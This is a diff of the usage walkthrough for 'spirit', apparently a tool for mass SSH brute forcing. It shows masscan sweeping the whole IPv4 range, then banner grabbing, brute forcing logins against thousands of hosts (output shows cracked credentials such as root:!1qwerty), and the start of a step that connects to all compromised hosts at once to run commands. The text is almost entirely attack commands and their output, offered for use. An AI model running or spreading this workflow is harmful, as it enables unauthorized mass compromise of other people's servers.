@@ -14,12 +14,11 @@ $ masscan \
     --exclude 255.255.255.255 \
     -oG open.lst
 Scanning 4294967295 hosts [4 ports/host]
-# Masscan will create an open.lst file in oG (output Greppable) format.
+# masscan will create an open.lst file in oG (output Greppable) format.
 
 # Parse open.lst to format the data, so that spirit can understand it.
 $ ./spirit parse open.lst
 INFO created h.lst in HOST:PORT format
-# spirit created a HOST:PORT formatted h.lst file, you can provide your custom file name using the `--file` flag.
 
 # create a filter.lst file if you want to skip certain SSH versions.
 $ cat >filter.lst<< EOF
@@ -29,8 +28,7 @@ SSH-2.0-Comware
 EOF
 
 # Test these open ports if they're running SSH by grabbing banners.
-# Spirit includes custom designed SSH connection flow.
-# you can also auto-exclude bogus hosts using the --filter option.
+# includes custom designed SSH connection flow.
 $ ./spirit banner
 SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
 INFO created b.lst in HOST:PORT:BANNER format
@@ -53,15 +51,14 @@ $ ./spirit brute
 INFO loaded h.lst with 26803 hosts
 INFO loaded p.lst with 4881 logins
 [2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
-
 failed connections statistics:
 (    7)  ssh: closed network connection 30s timeout
 (    7)  total failed
-
 results stored in:
 - found.ssh # for quick manual connect
 - found.login # user:pass combinations that worked
 - found.lst # used by `spirit omni` for connecting en-masse
+out of [26803]hosts [4000]bruted [3000]found [19803]blocked
 
 # Connect to all your found hosts automatically & run commands.
 # omni will automatically attempt to connect to hosts present in the found.lst file,
